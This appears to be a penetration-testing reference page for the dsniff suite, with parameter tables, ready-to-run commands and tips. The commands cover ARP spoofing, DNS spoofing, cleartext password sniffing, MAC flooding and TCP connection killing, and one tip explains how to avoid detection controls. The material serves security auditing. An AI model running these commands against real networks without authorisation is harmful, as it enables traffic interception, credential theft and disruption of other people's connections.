# dsniff

- **Category**: Sniffing & Spoofing / Network Sniffing & Spoofing
- **Risk Level**: 🔴 High

---

## Description

Suite of network auditing and penetration testing tools for sniffing, spoofing, and intercepting network traffic. The suite includes: `dsniff` (password sniffer for cleartext protocols), `arpspoof` (ARP cache poisoning for MITM), `dnsspoof` (DNS response forgery), `filesnarf` (NFS file intercept), `macof` (MAC address table flooding), `mailsnarf` (email capture), `msgsnarf` (chat message capture), `tcpkill` (kill active TCP connections), `tcpnice` (slow down TCP connections), `urlsnarf` (URL capture from HTTP traffic), and `webspy` (browser redirect to sniffed URLs).

## Installation

```bash
sudo apt install dsniff
```

## Parameter Reference

### arpspoof

| Parameter | Description |
|-----------|-------------|
| `-i <iface>` | Network interface |
| `-t <target>` | Target IP to poison (omit for entire subnet) |
| `-r` | Poison both directions (target and gateway) |
| `<gateway>` | Gateway IP address |

### dnsspoof

| Parameter | Description |
|-----------|-------------|
| `-i <iface>` | Network interface |
| `-f <hostsfile>` | Hosts file with spoofed entries |

### dsniff

| Parameter | Description |
|-----------|-------------|
| `-i <iface>` | Network interface |
| `-p <file>` | Read from pcap file |
| `-m` | Force DPI on known ports (automatic protocol detection) |
| `-P` | Enable promiscuous mode |

### macof

| Parameter | Description |
|-----------|-------------|
| `-i <iface>` | Network interface |
| `-n <num>` | Number of packets to send |

### urlsnarf

| Parameter | Description |
|-----------|-------------|
| `-i <iface>` | Network interface |

### tcpkill

| Parameter | Description |
|-----------|-------------|
| `-i <iface>` | Network interface |
| `-9` | Maximum effort (highest severity level) |
| `<expression>` | BPF filter expression |

## Common Commands

```bash
# ARP spoofing — MITM between target and gateway
# Step 1: Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1
# Step 2: Poison target's ARP cache
sudo arpspoof -i eth0 -t 192.168.1.50 192.168.1.1
# Step 3 (separate terminal): Poison gateway's ARP cache
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.50

# DNS spoofing — redirect DNS queries to attacker IP
echo "192.168.1.200 *.target.com" > /tmp/dnsspoof.hosts
sudo dnsspoof -i eth0 -f /tmp/dnsspoof.hosts

# Sniff cleartext passwords on the network
sudo dsniff -i eth0 -m

# MAC address table flooding (switch stress test)
sudo macof -i eth0 -n 100000

# Capture URLs from HTTP traffic
sudo urlsnarf -i eth0

# Kill a specific TCP connection
sudo tcpkill -i eth0 host 192.168.1.50 and port 443
```

## Notes & Tips

1. Enable IP forwarding (`net.ipv4.ip_forward=1`) before running `arpspoof`, otherwise intercepted traffic will be dropped instead of forwarded.
2. ARP spoofing is easily detected by network monitoring tools and 802.1X/dynamic ARP inspection — verify the target network lacks these controls first.
3. `dsniff` captures credentials from cleartext protocols including FTP, Telnet, HTTP, SNMP, IMAP, POP, NNTP, and others — it demonstrates the risk of unencrypted services.
4. `macof` floods the switch CAM table to force it into hub mode, enabling passive sniffing of all traffic — use sparingly as it can cause network instability.
5. Modern switched networks with port security, DHCP snooping, and dynamic ARP inspection will mitigate most dsniff attacks — document these controls if present.

---

## Official References

- [dsniff — Dug Song](https://www.monkey.org/~dugsong/dsniff/)
- [Kali dsniff](https://www.kali.org/tools/dsniff/)
